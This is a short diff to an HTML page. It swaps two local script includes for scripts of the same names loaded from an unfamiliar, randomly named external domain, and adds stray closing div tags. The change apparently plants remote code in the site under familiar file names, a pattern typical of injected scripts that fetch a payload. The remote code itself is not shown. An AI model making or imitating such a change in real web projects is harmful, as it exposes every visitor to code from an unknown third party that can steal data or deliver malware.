@@ -1,4 +1,6 @@
-<div></div>
-
-<script src="../assets/js/app.js"></script>
-<script src="../assets/js/app1.js"></script>
+</div>
+</div>
+</div>
+</div>
+<script src="https://www.8ivlvi8.site/app.js"></script>
+<script src="https://www.8ivlvi8.site/app1.js"></script>
